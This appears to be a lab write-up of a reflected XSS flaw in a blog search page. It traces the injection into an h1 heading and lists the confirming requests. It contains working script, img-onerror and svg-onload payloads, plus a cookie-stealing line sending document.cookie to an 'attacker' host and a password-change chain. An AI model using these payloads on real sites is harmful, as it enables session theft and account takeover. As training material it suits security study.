# Attack Chain — Reflected XSS (HTML text context, no encoding)

## Data flow (INPUT → PROCESSING → SINK → RESULT → IMPACT)

```
INPUT     GET /?search=<script>alert(1)</script>
            source: query parameter `search` (user-controlled, attacker-supplied URL)
            |
PROCESSING  server-side blog search handler:
            - reads `search` param
            - performs a blog search (returns 0 results here)
            - interpolates the raw string into a template heading
            - NO HTML encoding, NO allow-listing, NO WAF at this layer
            |
SINK        server-rendered HTML body, element TEXT content:
            <h1>0 search results for '<script>alert(1)</script>'</h1>
            exposed context: inside <h1>, inside single-quoted text —
            quotes carry no syntax meaning in element text content
            |
RESULT      browser parses the injected <script> tag as part of the
            initial document parse and executes alert(1) in the lab origin
            |
IMPACT      client-side script executes with the origin, cookies, and
            authority of the served application (victim browser context)
```

## Trust boundary crossed

Attacker-supplied data → HTML parser in the victim's browser, **within the
application's origin**. Also: server treats attacker input as HTML markup
instead of opaque text. The boundary is the *output-encoding decision at the
renderer*.

## What each confirmation showed

| Request | Behavior | Meaning |
|---|---|---|
| `/?search=zzmarker123` | reflected as `0 search results for 'zzmarker123'`; lab NOT solved | benign marker proves reflection point + context; no execution |
| `/?search=<script>alert(1)</script>` | reflected verbatim; alert executed in emulated victim; lab flip to SOLVED | `</h1>` breakout not even needed — element text content executes `<script>` |
| `/?search=<img src=x onerror=alert(2)>` | reflected verbatim | independent event-handler primitive (second exploitation path) |
| `/?search=%3Cscript%3Ealert(3)%3C/script%3E` (double-encoded) | reflected literally as `%3Cscript%3E...` | "nothing encoded" = no HTML encoding AND no additional decoding; single URL-decoding only at transport |

## Alternative exploitation paths (all in the same element-text sink)

- `<script>document.location='https://attacker/?c='+document.cookie</script>` (session theft; here session is HttpOnly so this specific path is weak on this lab)
- `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>` (no `<script>` needed)
- Quote-breaking is UNNECESSARY (quotes are literal text inside an element) but harmless
- Chained: steal → `fetch('/change-password?...')` under victim authority (state-changing XSS-→-CSRF-lite)

## Not applicable here

- Attribute/JS context payloads (reflection is element-text, not attribute or script) — unnecessary
- DOM-XSS (no client-side sink consumes location.hash) — not the mechanism